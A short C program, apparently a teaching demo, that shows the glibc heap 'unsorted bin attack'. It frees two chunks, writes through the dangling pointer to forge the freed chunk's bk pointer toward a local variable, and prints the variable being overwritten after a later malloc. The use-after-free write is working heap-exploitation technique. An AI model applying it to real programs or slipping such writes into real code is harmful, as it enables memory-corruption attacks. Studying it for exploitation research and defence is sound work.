#include <stdio.h>
#include <stdlib.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stderr,0,2,0);
	setvbuf(stdout,0,2,0);
}

int main()
{
	void *p1,*p2,*p3,*p4,*p5;
	long long*ptr;
	long long var=0;

	setbufs();

	printf("before unsorted bin attack, var:%llx\n",var);
	p1=malloc(0x100);
	p2=malloc(0x100);
	malloc(0x20);

	free(p1);
	free(p2);

	ptr=(long long*)p1;

	*ptr=0;
	*(ptr+1)=(long long*)&var-2;

	p3=malloc(0x210);
	printf("after unsorted bin attack, var:%llx\n",var);

	return 0;
}
